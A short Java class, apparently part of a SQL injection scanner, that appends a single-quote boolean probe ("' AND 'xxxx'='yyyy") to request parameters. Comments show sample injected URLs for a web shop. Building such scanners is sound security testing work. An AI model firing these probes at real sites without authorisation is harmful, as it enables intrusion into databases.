package de.nshevchenko.sqlinjection.type;

import org.apache.commons.lang.RandomStringUtils;

/**
 * Created by IntelliJ IDEA.
 * User: nshevchenko
 * Date: 18.05.12
 * Time: 12:31
 * To change this template use File | Settings | File Templates.
 */
public class SingleQuotedString implements SQLInjection{


    //action=artikel' AND 'IXSZX'='IXSZX&cat=8&id=17&artlang=de
    //action=artikel&cat=8&id=17&artlang=de' AND 'ITCOB'='ITCOB
    
    public String createInjection(String oldValue){
        StringBuffer myNewValue = new StringBuffer(oldValue);
        myNewValue.append("' AND '");
        myNewValue.append(RandomStringUtils.randomAlphabetic(4));
        myNewValue.append("'='");
        myNewValue.append(RandomStringUtils.randomAlphabetic(4));
        return myNewValue.toString();
    }


}
